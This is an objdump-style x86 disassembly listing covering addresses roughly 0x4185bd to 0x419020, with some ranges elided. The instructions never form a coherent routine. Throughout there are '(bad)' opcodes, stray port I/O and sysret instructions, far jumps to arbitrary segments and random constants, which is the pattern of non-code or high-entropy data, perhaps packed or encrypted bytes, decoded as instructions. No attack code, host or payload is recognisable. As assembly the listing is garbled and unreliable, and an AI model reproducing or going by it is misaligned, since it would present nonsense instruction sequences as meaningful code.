  4185bd:	add    edi,DWORD PTR [esi]
  4185bf:	dec    ebx
  4185c0:	mov    ebp,0xe92052e9
  4185c5:	stos   BYTE PTR es:[edi],al
  4185c6:	sub    ah,cl
  4185c8:	or     eax,0x3b035142
  4185cd:	push   esi
  4185ce:	add    bl,BYTE PTR ds:0xf2004dee
  4185d4:	cwde   
  4185d5:	pop    ecx
  4185d6:	cmp    esp,DWORD PTR [edi-0x7f45b08d]
  4185dc:	push   eax
  4185dd:	sti    
  4185de:	pop    esi
  4185df:	mov    ds:0xd992cdee,al
  4185e4:	xor    bl,BYTE PTR [eax-0x6ed67f23]
  4185ea:	popa   
  4185eb:	enter  0x9026,0xff
  4185ef:	push   DWORD PTR [esi-0x58]
  4185f2:	sub    edx,DWORD PTR [ebx-0x2a385f35]
  4185f8:	cdq    
  4185f9:	or     al,0xfc
  4185fb:	mov    BYTE PTR [esp+eax*1-0x65],ch
  4185ff:	int3   
  418600:	pop    ebp
  418601:	pop    ss
  418602:	push   eax
  418603:	shl    BYTE PTR [edx-0x35],cl
  418606:	scas   al,BYTE PTR es:[edi]
  418607:	fidivr WORD PTR [edx+0x44]
  41860a:	sub    eax,0x532d6283
  41860f:	or     DWORD PTR [ebp-0x53],edi
  418612:	leave  
  418613:	int    0x94
  418615:	sub    al,0xb
  418617:	pop    edi
  418618:	fwait
  418619:	shl    edi,1
  41861b:	stos   BYTE PTR es:[edi],al
  41861c:	call   0xf42ebcba
  418621:	mov    WORD PTR [edi+0x2c],gs
  418624:	mov    fs,WORD PTR [edx]
  418626:	retf   0xac6
  418629:	add    ebx,ebp
  41862b:	out    dx,eax
  41862c:	xor    al,0x7d
  41862f:	mov    al,0xc5
  418631:	les    ebx,FWORD PTR [eax]
  418633:	push   eax
  418634:	rcl    ebx,0xc2
  418637:	ins    DWORD PTR es:[edi],dx
  418638:	dec    edx
  418639:	cmp    cl,BYTE PTR [ecx-0x7d]
  41863c:	std    
  41863d:	xchg   edi,eax
  41863e:	push   edx
  41863f:	inc    ebx
  418640:	repnz adc bh,BYTE PTR [ebx]
  418643:	mov    ds:0xcf321332,eax
  418648:	xor    DWORD PTR [ecx+0x6e],esi
  41864b:	jns    0x41868d
  41864d:	inc    ebp
  41864e:	enter  0x5aa5,0xf9
  418652:	sub    BYTE PTR [edx-0xf],bh
  418655:	and    edi,DWORD PTR [ecx]
  418657:	push   ds
  418658:	ins    BYTE PTR es:[edi],dx
  418659:	sbb    BYTE PTR [esi+edi*4],0x57
  41865d:	adc    DWORD PTR [edx],ebx
  41865f:	mov    al,ds:0x854713e
  418664:	or     eax,0x64f47329
  418669:	in     al,dx
  41866a:	daa    
  41866b:	xlat   BYTE PTR ds:[ebx]
  41866c:	stos   BYTE PTR es:[edi],al
  41866d:	jno    0x41860c
  41866f:	inc    ebp
  418670:	loopne 0x41862b
  418672:	pushf  
  418673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418674:	and    esi,DWORD PTR [edi-0x9ed4899]
  41867a:	stos   DWORD PTR es:[edi],eax
  41867b:	sbb    BYTE PTR [edx*8+0x1216f000],dl
  418682:	mov    eax,0xb349f2d
  418687:	out    dx,eax
  418688:	jmp    0x986:0x573cf1a8
  41868f:	rol    DWORD PTR [eax],1
	...
  4186f1:	add    BYTE PTR [eax],al
  4186f3:	add    BYTE PTR [ebx-0x44c35fd8],dl
  4186f9:	mov    esp,0x8d0caf9f
  4186fe:	cmp    edx,edx
  418700:	fdivr  DWORD PTR [ecx+0x4a]
  418703:	aas    
  418704:	pushf  
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR [ecx+eax*1],al
  41870a:	add    BYTE PTR [eax],al
  41870c:	mov    DWORD PTR [edi+0x38],eax
  41870f:	pop    esp
  418710:	arpl   WORD PTR [esi+0x2c],bp
  418713:	stos   DWORD PTR es:[edi],eax
  418714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418715:	or     bl,al
  418717:	popa   
  418718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418719:	cmp    al,0x5e
  41871b:	xor    BYTE PTR [eax-0x6f],cl
  41871e:	cs pop ecx
  418720:	mov    WORD PTR [esi+0x70],es
  418723:	jb     0x418748
  418725:	and    DWORD PTR [edx+0x72e07383],edx
  41872b:	test   BYTE PTR [ecx-0x3c60ddc],dl
  418731:	dec    BYTE PTR [ebp+0xda2d995]
  418737:	arpl   WORD PTR [ebp-0x13],ax
  41873a:	push   ebp
  41873b:	and    dh,BYTE PTR [ebp+0xc]
  41873e:	aad    0x80
  418740:	popf   
  418741:	popa   
  418742:	push   eax
  418743:	sub    BYTE PTR [ebx],ch
  418745:	lds    eax,FWORD PTR [eax-0x3aa6707d]
  41874b:	repz add BYTE PTR [edx+0xefb9b34],0x24
  418753:	mov    edi,esi
  418755:	or     esp,DWORD PTR [ebx-0x53]
  418758:	pop    ebp
  418759:	ss inc esp
  41875b:	pop    eax
  41875c:	stc    
  41875d:	jae    0x418764
  41875f:	out    dx,al
  418760:	test   al,0x84
  418762:	popf   
  418763:	mov    eax,0x1cd50ab0
  418768:	cmp    BYTE PTR [ebx+eax*1-0x38920b9e],0x77
  418770:	fadd   QWORD PTR [ebp+0x293cdfb6]
  418776:	mov    ah,0x55
  418778:	cli    
  418779:	mov    BYTE PTR [si+0x22],al
  41877d:	dec    edi
  41877e:	push   ebp
  41877f:	std    
  418780:	iret   
  418781:	rcr    bh,0xd4
  418784:	mov    esi,0xb1e59d00
  418789:	sbb    DWORD PTR [esi+eax*2-0x39],0x155c1125
  418791:	loope  0x4187d7
  418793:	out    dx,al
  418794:	jae    0x4187b3
  418796:	add    dh,BYTE PTR [ecx+0x5]
  418799:	lahf   
  41879a:	ficomp DWORD PTR [edx]
  41879c:	ret    
  41879d:	enter  0xec1f,0x37
  4187a1:	push   ecx
  4187a2:	mov    DWORD PTR [ecx-0x5387e217],esi
  4187a8:	div    BYTE PTR [ebx]
  4187aa:	xchg   ebx,eax
  4187ab:	adc    esi,DWORD PTR [ebx]
  4187ad:	pop    eax
  4187ae:	data16 rcl BYTE PTR fs:[esi+esi*2+0x53],1
  4187b4:	aas    
  4187b5:	inc    ebx
  4187b6:	and    BYTE PTR [ebp-0x32],ah
  4187b9:	pop    esi
  4187ba:	mov    eax,0x6cc511c
  4187bf:	call   0xf840d137
  4187c4:	cs sub bl,0x24
  4187c8:	mov    ch,0x36
  4187ca:	mov    bh,0x24
  4187cc:	and    BYTE PTR [edi+esi*1-0x21],dl
  4187d0:	mov    edi,0x9e86a131
  4187d5:	sbb    cl,BYTE PTR [edx-0xbd45404]
  4187db:	xchg   esi,eax
  4187dc:	inc    edx
  4187dd:	pop    ebp
  4187de:	and    al,0x51
  4187e0:	cmp    al,0x2f
  4187e2:	shl    DWORD PTR [ebx+0x30],cl
  4187e5:	pop    ss
  4187e6:	push   0xffffffeb
  4187e8:	sub    DWORD PTR [eax],ecx
  4187ea:	adc    BYTE PTR [ebp+0x3206d79e],ch
  4187f0:	sub    dl,BYTE PTR [ebx+eiz*1]
  4187f3:	adc    al,0x15
  4187f5:	inc    edx
  4187f6:	and    eax,0xd3189ccb
  4187fb:	hlt    
  4187fc:	pusha  
  4187fd:	sub    eax,0x5c3d2414
  418802:	sub    ebp,edi
  418804:	add    DWORD PTR [ebx],ebx
  418806:	ss push ecx
  418808:	inc    esp
  418809:	aad    0xd
  41880b:	jmp    0x0:0x39dee288
	...
  418872:	add    BYTE PTR [eax],al
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi+0x6f9c3acd]
  418881:	imul   esp,DWORD PTR gs:[ebp-0x60],0x4000103
  418889:	add    DWORD PTR [eax],eax
  41888b:	add    BYTE PTR [esi*2-0x7a8cf26a],bh
  418892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418893:	repnz push ebp
  418895:	cmp    DWORD PTR [esi-0x27340cc4],eax
  41889b:	ins    BYTE PTR es:[edi],dx
  41889c:	jo     0x4188a1
  41889e:	dec    ebp
  41889f:	rcr    BYTE PTR [ecx+0x61],0x11
  4188a3:	dec    ecx
  4188a4:	sbb    ch,BYTE PTR [esi]
  4188a6:	stos   BYTE PTR es:[edi],al
  4188a7:	push   edi
  4188a8:	test   eax,0xfeac008d
  4188ad:	push   0xe6dd0318
  4188b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188b3:	fisub  DWORD PTR [esi-0x7e7528d0]
  4188b9:	sahf   
  4188ba:	mov    dh,0x1b
  4188bc:	sub    eax,0x8b550c6e
  4188c1:	xchg   ebx,eax
  4188c2:	ins    DWORD PTR es:[edi],dx
  4188c3:	pushf  
  4188c4:	add    DWORD PTR [ecx],0xffffffb4
  4188c7:	add    eax,0xe520f34a
  4188cc:	inc    ebx
  4188cd:	out    dx,al
  4188ce:	arpl   WORD PTR [eax],bx
  4188d0:	xchg   ebx,eax
  4188d1:	std    
  4188d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188d3:	sub    ch,dl
  4188d5:	jmp    0x3f6f:0x5588c008
  4188dc:	loope  0x41885f
  4188de:	stos   BYTE PTR es:[edi],al
  4188df:	pop    esi
  4188e0:	xchg   edx,eax
  4188e1:	lahf   
  4188e2:	and    DWORD PTR [ecx],edi
  4188e4:	pop    esi
  4188e5:	cs es pop ecx
  4188e8:	jnp    0x41886c
  4188ea:	xchg   ebx,eax
  4188eb:	retf   
  4188ec:	xor    DWORD PTR [eax],ecx
  4188ee:	rcl    DWORD PTR [esi+0x25f1c1f],cl
  4188f4:	dec    eax
  4188f5:	xor    DWORD PTR [edi+ebp*1-0x39],eax
  4188f9:	aam    0x80
  4188fb:	ss inc esp
  4188fd:	gs jle 0x41889a
  418900:	xlat   BYTE PTR ds:[ebx]
  418901:	jmp    0xaa94:0xa7dece20
  418908:	dec    edi
  418909:	sbb    ebx,DWORD PTR [ebx+0x3]
  41890c:	mov    bl,0xff
  41890e:	mov    eax,0xe7983f2f
  418913:	loop   0x41892f
  418915:	pushf  
  418916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418917:	into   
  418918:	outs   dx,DWORD PTR ds:[esi]
  418919:	and    bh,dl
  41891b:	xchg   edx,eax
  41891c:	in     al,dx
  41891d:	mov    ebx,0x22f12475
  418922:	es enter 0x9f4c,0x3a
  418927:	repz xor ch,BYTE PTR [esi+0x7b]
  41892b:	and    al,0xd5
  41892d:	jno    0x41891d
  41892f:	push   cs
  418930:	std    
  418931:	mov    edx,0xeba47ac0
  418936:	and    al,0x43
  418938:	inc    eax
  418939:	ja     0x4188d8
  41893b:	stos   DWORD PTR es:[edi],eax
  41893c:	cmp    esp,DWORD PTR [eax-0x5cb51ed1]
  418942:	push   esi
  418943:	push   eax
  418944:	scas   al,BYTE PTR es:[edi]
  418945:	mov    edx,ecx
  418947:	(bad)  
  418948:	fidiv  DWORD PTR [ebx-0x272e46c1]
  41894e:	dec    edi
  41894f:	lods   al,BYTE PTR ds:[esi]
  418950:	add    BYTE PTR [edx+0x14],dh
  418953:	dec    eax
  418954:	and    al,0x3d
  418956:	sahf   
  418957:	dec    edx
  418958:	stos   BYTE PTR es:[edi],al
  418959:	cli    
  41895a:	inc    edi
  41895b:	inc    ecx
  41895c:	ds jp  0x4189ac
  41895f:	dec    esi
  418960:	push   ds
  418961:	inc    ecx
  418962:	mov    ebp,0x77e7a14
  418967:	xor    al,0xf9
  418969:	or     eax,DWORD PTR [ebp+0x30]
  41896c:	stos   BYTE PTR es:[edi],al
  41896d:	sti    
  41896e:	das    
  41896f:	xor    al,0xcd
  418971:	and    eax,0xa4eb0bbe
  418976:	inc    esi
  418977:	test   DWORD PTR [edi+0x6a733922],edx
  41897d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41897e:	jbe    0x418913
  418980:	cmp    al,0x5e
  418982:	in     al,dx
  418983:	xor    DWORD PTR [ebp-0x77],ebx
  418986:	jl     0x4189f6
  418988:	mov    ebp,0x9d592620
  41898d:	cmp    esi,DWORD PTR [esp+ebp*1]
	...
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x9c36f569
  418a03:	and    DWORD PTR [esp+eax*1+0x1040001],0xe0c30000
  418a0e:	and    bh,bl
  418a10:	sti    
  418a11:	sbb    al,0x4f
  418a13:	push   eax
  418a14:	sbb    DWORD PTR [eax-0x69],edi
  418a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a18:	pop    ss
  418a19:	and    BYTE PTR [ecx],dl
  418a1b:	mov    ds:0xadb9a9a3,eax
  418a20:	jo     0x418a04
  418a22:	jne    0x418a3d
  418a24:	aad    0x5f
  418a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a27:	lahf   
  418a28:	int3   
  418a29:	hlt    
  418a2a:	loope  0x418a1e
  418a2c:	fsubr  st(2),st
  418a2e:	data16 add al,0x44
  418a31:	fs add al,0x33
  418a34:	out    dx,al
  418a35:	mov    eax,ds:0xe40743a8
  418a3a:	jae    0x418a8a
  418a3c:	sub    al,0xc9
  418a3e:	pshufw mm1,QWORD PTR [ebp+0x41b3fba8],0xcc
  418a46:	sbb    eax,0x2c024408
  418a4b:	loop   0x418acc
  418a4d:	scas   eax,DWORD PTR es:[edi]
  418a4e:	repz lea ebp,[ebx+0x2c]
  418a52:	dec    esp
  418a53:	dec    esi
  418a54:	sbb    ebp,ecx
  418a56:	test   al,0xab
  418a58:	rol    BYTE PTR [edi],0x7c
  418a5b:	out    dx,al
  418a5c:	or     DWORD PTR ss:[esp+edx*1],ebp
  418a60:	mov    cl,0xbf
  418a62:	outs   dx,DWORD PTR ds:[esi]
  418a63:	mov    eax,ds:0xc5b1aa4e
  418a68:	fs and edx,ebx
  418a6b:	shl    BYTE PTR [ebp+0xe3ea8c9],1
  418a71:	pop    esp
  418a72:	inc    edx
  418a73:	mov    ss,WORD PTR [ecx]
  418a75:	pushf  
  418a76:	push   ss
  418a77:	cmp    edi,DWORD PTR [ebp+0x2acffd74]
  418a7d:	mov    ds,edx
  418a7f:	jnp    0x418ab4
  418a81:	fdivr  DWORD PTR ds:0x1eaea990
  418a87:	je     0x418b02
  418a89:	mov    esi,0xa397c752
  418a8e:	xor    al,0xac
  418a90:	pop    ss
  418a91:	push   cs
  418a92:	dec    ecx
  418a93:	xor    BYTE PTR [ebx-0x614bdbd6],dl
  418a99:	mov    edi,DWORD PTR [esi-0x14ebcc0e]
  418a9f:	out    0x5,al
  418aa1:	jp     0x418a40
  418aa3:	dec    edi
  418aa4:	mov    cl,0xf9
  418aa6:	test   al,0x4
  418aa8:	cmp    esp,ebx
  418aaa:	mov    ebp,0xe9ea72bc
  418aaf:	mov    esi,0x58d9f66b
  418ab4:	jmp    0x3ce165c
  418ab9:	rol    DWORD PTR [ecx],0x8c
  418abc:	xor    cl,BYTE PTR [eax+0x2b]
  418abf:	cmp    DWORD PTR [edi+0x2a9031a2],edx
  418ac5:	push   edi
  418ac6:	cmc    
  418ac7:	sbb    BYTE PTR es:[ebx+eiz*8+0x3d],0x34
  418acd:	mov    al,0xec
  418acf:	cwde   
  418ad0:	add    DWORD PTR [ebx+0x6f],ebx
  418ad3:	push   ebp
  418ad4:	in     al,0xeb
  418ad6:	mov    al,ds:0xbccbd084
  418adb:	inc    ecx
  418adc:	fldenv [edx+0x7d]
  418adf:	outs   dx,BYTE PTR ds:[esi]
  418ae0:	add    BYTE PTR [edx+eiz*2],dh
  418ae3:	adc    bh,BYTE PTR [edi+0x5a]
  418ae6:	int    0xfc
  418ae8:	add    DWORD PTR [edx-0x3a7afc11],ebp
  418aee:	loope  0x418b25
  418af0:	add    cl,BYTE PTR [esi]
  418af2:	mov    ebp,0xb632f159
  418af7:	repz sti 
  418af9:	xor    BYTE PTR fs:[ecx-0x72a35ad2],dl
  418b00:	mov    eax,0x5f004f09
  418b05:	mov    bh,0xd1
  418b07:	stos   DWORD PTR es:[edi],eax
  418b08:	fidivr WORD PTR [eax]
  418b0a:	test   eax,0xa7f7ef4f
  418b0f:	jle    0x418b11
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xcf
  418b81:	(bad)  
  418b83:	pop    es
  418b84:	test   al,0x5
  418b86:	add    DWORD PTR [eax],eax
  418b88:	add    al,0x1
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	xor    DWORD PTR [ebx],esi
  418b8e:	xor    al,0x5e
  418b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b91:	mov    BYTE PTR [edi],cl
  418b93:	push   ecx
  418b94:	xchg   DWORD PTR [edx+0x64156eb1],edi
  418b9a:	stos   BYTE PTR es:[edi],al
  418b9b:	and    edx,DWORD PTR [edi-0x5cbadbcc]
  418ba1:	sbb    cl,BYTE PTR [esi+0x13]
  418ba4:	lea    ecx,[esi]
  418ba6:	mov    ds:0x128969a6,al
  418bab:	sbb    ch,BYTE PTR [ebp+0x23df1a1a]
  418bb1:	aaa    
  418bb2:	inc    ebp
  418bb3:	sbb    eax,0x99ffe935
  418bb8:	out    0x15,eax
  418bba:	into   
  418bbb:	cmc    
  418bbc:	mov    esp,DWORD PTR [ecx*1-0x2c25c179]
  418bc3:	or     bh,dh
  418bc5:	fsubr  st,st(6)
  418bc7:	adc    BYTE PTR [ebp-0x79],cl
  418bca:	out    dx,al
  418bcb:	jnp    0x418bb7
  418bcd:	fcomp  DWORD PTR [ecx-0x50]
  418bd0:	mov    ecx,0x5f2947b8
  418bd5:	sub    eax,0x65df90ee
  418bda:	jg     0x418b98
  418bdc:	imul   eax,DWORD PTR [ecx-0x60],0x435d8bd1
  418be3:	adc    dh,bh
  418be5:	mov    edx,0xc16859dd
  418bea:	jbe    0x418b77
  418bec:	lock sub edx,0xf
  418bf0:	sbb    DWORD PTR [ecx],eax
  418bf2:	test   al,0x4d
  418bf4:	ss inc eax
  418bf6:	and    dl,ch
  418bf8:	rol    DWORD PTR [edi-0xb],1
  418bfb:	aad    0x19
  418bfd:	sub    eax,0xbc29ab69
  418c02:	je     0x418bde
  418c04:	dec    edx
  418c05:	aaa    
  418c06:	dec    edi
  418c07:	out    dx,eax
  418c08:	xchg   edx,eax
  418c09:	mov    cl,0x81
  418c0b:	(bad)  
  418c0c:	push   ss
  418c0d:	mov    ebx,0xd84fbb83
  418c12:	js     0x418bac
  418c14:	pop    ss
  418c15:	imul   ecx,DWORD PTR [ecx-0x33db9670],0x8a27e6e8
  418c1f:	std    
  418c20:	bound  ebp,QWORD PTR [esi-0x793d7cd7]
  418c26:	fs aam 0x39
  418c29:	test   DWORD PTR [eax],esi
  418c2b:	mov    eax,0xa5ba421f
  418c30:	jmp    0x3a5b7542
  418c35:	pop    es
  418c36:	jae    0x418c45
  418c38:	sub    ah,BYTE PTR [ebx]
  418c3a:	xor    eax,0x8492b808
  418c3f:	fst    QWORD PTR [esi]
  418c41:	add    edi,0xdfb76791
  418c47:	rol    bl,0x78
  418c4a:	data16 adc al,0xda
  418c4d:	rcl    BYTE PTR [ebx],1
  418c4f:	dec    esp
  418c50:	jp     0x418c28
  418c52:	pop    ss
  418c53:	mov    bl,0xa3
  418c55:	cwde   
  418c56:	mov    es,WORD PTR [edi-0x63d08516]
  418c5c:	jp     0x418c99
  418c5e:	dec    ecx
  418c5f:	and    eax,0xcc793df5
  418c64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c65:	lea    ebp,[esi-0x2158732b]
  418c6b:	inc    esi
  418c6c:	mov    bl,0xd9
  418c6e:	sbb    al,0x19
  418c70:	lea    esp,[eax]
  418c72:	xchg   BYTE PTR [eax],ah
  418c74:	lea    edi,[edx-0x4b55ef44]
  418c7a:	arpl   dx,di
  418c7c:	iret   
  418c7d:	inc    edx
  418c7e:	mov    ebp,0x1cccdcf5
  418c83:	ja     0x418ca8
  418c85:	push   ecx
  418c86:	fist   DWORD PTR [eax+0x2e]
  418c89:	stos   DWORD PTR es:[edi],eax
  418c8a:	jns    0x418ce3
  418c8c:	fisubr DWORD PTR [ebx+0x2a]
  418c8f:	sbb    BYTE PTR [eax],al
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	shl    BYTE PTR [edi],cl
  418d01:	push   ebp
  418d02:	xchg   BYTE PTR [edx],dh
  418d04:	lods   al,BYTE PTR ds:[esi]
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    al,0x1
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	lea    ebp,[esi]
  418d0e:	sub    bh,BYTE PTR [eax+0xd]
  418d11:	pop    edx
  418d12:	inc    ebx
  418d13:	loope  0x418d03
  418d15:	dec    edi
  418d16:	mov    edx,DWORD PTR [edi]
  418d18:	(bad)  
  418d19:	fld    DWORD PTR [eax+0x25]
  418d1c:	fild   QWORD PTR [ebp+0x27]
  418d1f:	sub    eax,0x4cff9359
  418d24:	fbstp  TBYTE PTR [edx+eiz*8]
  418d27:	sub    al,0xef
  418d29:	jp     0x418cbf
  418d2b:	retf   
  418d2c:	mov    DWORD PTR [ebp+0xa9399e5],ebp
  418d32:	(bad)  
  418d34:	jb     0x418ce3
  418d36:	(bad)  
  418d37:	jg     0x418cbe
  418d39:	add    eax,0x55e956e
  418d3e:	mov    eax,ds:0x6c425c59
  418d43:	mov    eax,ds:0xd4bd17c8
  418d48:	aam    0x5d
  418d4a:	(bad)  
  418d4b:	mov    ds:0xe07720e6,eax
  418d50:	ror    edx,0x10
  418d53:	dec    ebx
  418d54:	push   edi
  418d55:	mov    ebp,0x283fb956
  418d5a:	fsub   DWORD PTR [edx]
  418d5c:	sbb    edi,0x2b
  418d5f:	(bad)  
  418d60:	jecxz  0x418d1d
  418d62:	lods   al,BYTE PTR ds:[esi]
  418d63:	ror    DWORD PTR [esp+ebp*1],0x7e
  418d67:	in     eax,0x29
  418d69:	shr    DWORD PTR [ebx+0x40],0x1a
  418d6d:	add    ecx,DWORD PTR es:[ebp+0x77a327d2]
  418d74:	inc    edx
  418d75:	mov    edi,0x312a6ebb
  418d7a:	ins    DWORD PTR es:[edi],dx
  418d7b:	test   ch,bh
  418d7d:	aam    0xbb
  418d7f:	jmp    0x418d44
  418d81:	xlat   BYTE PTR ds:[ebx]
  418d82:	mov    al,ds:0x5db68313
  418d87:	ins    BYTE PTR es:[edi],dx
  418d88:	dec    DWORD PTR [edx-0x6a127dee]
  418d8e:	mov    ebx,0x149fd580
  418d93:	(bad)  
  418d94:	ja     0x418d1f
  418d96:	mov    ecx,0x423ead52
  418d9b:	repz std 
  418d9d:	cmp    BYTE PTR [edx-0x5aa56cff],al
  418da3:	cmp    al,0x64
  418da5:	mov    edi,cs
  418da7:	and    al,0x5e
  418da9:	pop    ecx
  418daa:	loop   0x418d91
  418dac:	or     ah,al
  418dae:	xor    eax,0x961821dd
  418db3:	aaa    
  418db4:	(bad)  
  418db6:	loopne 0x418d78
  418db8:	mov    ecx,0xf5fed1cb
  418dbd:	mov    WORD PTR [eax+0x6b1872ea],es
  418dc3:	dec    edi
  418dc4:	sub    bh,BYTE PTR [edx+0x4f323ce4]
  418dca:	or     BYTE PTR [eax-0x4d],dl
  418dcd:	js     0x418d98
  418dcf:	jp     0x418e2c
  418dd1:	int3   
  418dd2:	sub    al,BYTE PTR [esi]
  418dd4:	xchg   esi,ebp
  418dd6:	bound  edx,QWORD PTR [ebx]
  418dd8:	jno    0x418d78
  418dda:	inc    ebx
  418ddb:	std    
  418ddc:	inc    eax
  418ddd:	push   esp
  418dde:	loope  0x418dd8
  418de0:	fcom   st(1)
  418de2:	push   esi
  418de3:	push   esp
  418de4:	test   BYTE PTR [ebp+0x1b949f14],0xc1
  418deb:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ded:	ror    BYTE PTR [ebx-0x35f8c939],1
  418df3:	add    esp,DWORD PTR [edi]
  418df5:	iret   
  418df6:	pop    ds
  418df7:	xchg   BYTE PTR es:[ebx-0x6dd17506],cl
  418dfe:	mov    dl,0xc3
  418e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e01:	gs jp  0x418e61
  418e04:	pop    esp
  418e05:	jecxz  0x418d92
  418e07:	cmc    
  418e08:	test   BYTE PTR ds:[eax],ah
  418e0b:	addr16 or al,0x96
  418e0e:	es sahf 
	...
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0x32]
  418e81:	sysret 
  418e83:	retf   0x7b0
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    al,0x1
  418e8a:	add    BYTE PTR [eax],al
  418e8c:	outs   dx,DWORD PTR ds:[esi]
  418e8d:	loop   0x418eb2
  418e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e90:	fsub   QWORD PTR [edx-0x2047ded2]
  418e96:	xor    eax,DWORD PTR [esi+eax*2+0x7e4c4a54]
  418e9d:	sbb    eax,0x1e8f187b
  418ea2:	xchg   ebx,eax
  418ea3:	fisubr WORD PTR [ebx-0x26a6aa7d]
  418ea9:	xchg   esi,eax
  418eaa:	sbb    eax,0xceda4bde
  418eaf:	gs repz jmp 0xdfb8:0x4ae3bb26
  418eb8:	and    al,0xa7
  418eba:	xchg   ebx,eax
  418ebb:	out    0x5d,al
  418ebd:	xor    bl,BYTE PTR [edx+0x16]
  418ec0:	ror    BYTE PTR [edx-0x6da4ce9],cl
  418ec6:	mov    eax,0x7d4d911b
  418ecb:	out    dx,eax
  418ecc:	xor    al,0xf9
  418ece:	push   ebx
  418ecf:	(bad)  
  418ed0:	cmp    DWORD PTR [edi],eax
  418ed2:	(bad)  
  418ed3:	stos   DWORD PTR es:[edi],eax
  418ed4:	in     eax,dx
  418ed5:	xor    DWORD PTR [ecx+0x4a806a45],0x4d864f2c
  418edf:	stos   DWORD PTR es:[edi],eax
  418ee0:	jb     0x418ea5
  418ee2:	inc    eax
  418ee3:	or     dh,0xcf
  418ee6:	es fwait
  418ee8:	dec    ebx
  418ee9:	sbb    al,0x91
  418eeb:	mov    ecx,0xdac7e8ed
  418ef0:	jmp    0x49dc:0x280fd4cd
  418ef7:	inc    esp
  418ef8:	adc    eax,0xd2baeaf3
  418efd:	cli    
  418efe:	clc    
  418eff:	mov    bh,0x60
  418f01:	mov    edx,eax
  418f03:	loop   0x418f68
  418f05:	sub    dh,BYTE PTR [edi+0x1f9bd8b1]
  418f0b:	repnz sbb al,0xad
  418f0e:	xchg   ecx,eax
  418f0f:	(bad)  [edx+ebx*1]
  418f12:	xor    bh,dl
  418f14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f15:	push   eax
  418f16:	sbb    ecx,esp
  418f18:	push   esp
  418f19:	or     DWORD PTR [ecx+0xf],esp
  418f1c:	xchg   BYTE PTR [ecx],ch
  418f1e:	sbb    al,0x1f
  418f20:	jbe    0x418edb
  418f22:	push   0x25
  418f24:	dec    ebx
  418f25:	adc    al,0xe0
  418f27:	and    BYTE PTR [ecx],ah
  418f29:	sbb    al,0x8d
  418f2b:	(bad)  
  418f2c:	shl    cl,1
  418f2e:	mov    DWORD PTR [ebx+0x49375201],ebx
  418f34:	repnz push ebp
  418f36:	call   0x8238:0x5c0d42b6
  418f3d:	adc    eax,0x385b2a40
  418f42:	ss popa 
  418f44:	mov    dh,0x75
  418f46:	cmc    
  418f47:	adc    BYTE PTR [eax+0x6c],cl
  418f4a:	sub    al,0xdc
  418f4c:	stos   BYTE PTR es:[edi],al
  418f4d:	or     edx,DWORD PTR [edi]
  418f4f:	repnz xlat BYTE PTR ds:[ebx]
  418f51:	pop    ds
  418f52:	int3   
  418f53:	not    eax
  418f55:	rcl    bl,0xfd
  418f58:	inc    DWORD PTR [edi-0x6ceea5e3]
  418f5e:	das    
  418f5f:	xchg   ecx,eax
  418f60:	daa    
  418f61:	or     eax,0x433fceb7
  418f66:	mov    dh,0x95
  418f68:	push   ds
  418f69:	jp     0x418f04
  418f6b:	es and ebx,esi
  418f6e:	fs xchg esp,eax
  418f70:	adc    BYTE PTR [eax],ch
  418f72:	and    BYTE PTR fs:[ebx-0x1e37b4f8],al
  418f79:	imul   edi,eax,0x2
  418f7c:	cmp    BYTE PTR [edi],0xf
  418f7f:	int3   
  418f80:	pop    esi
  418f81:	fs call 0x22166372
  418f87:	jmp    0x3dfa6754
  418f8c:	sbb    al,cl
  418f8e:	addr16 ret 0x0
	...
  418ff2:	add    BYTE PTR [eax],al
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x2eaf1a7]
  419001:	loop   0x419076
  419003:	xor    eax,0x108b4
  419008:	add    al,0x1
  41900a:	add    BYTE PTR [eax],al
  41900c:	sub    BYTE PTR [edx+ebx*4+0x73f76a95],ah
  419013:	in     al,0x52
  419015:	push   ds
  419016:	adc    DWORD PTR [esi],esi
  419018:	sahf   
  419019:	push   ebx
  41901a:	mov    ah,cl
  41901c:	or     al,0xc1
  41901e:	jne    0x419018
  419020:	mov    ebp,0x857bec30
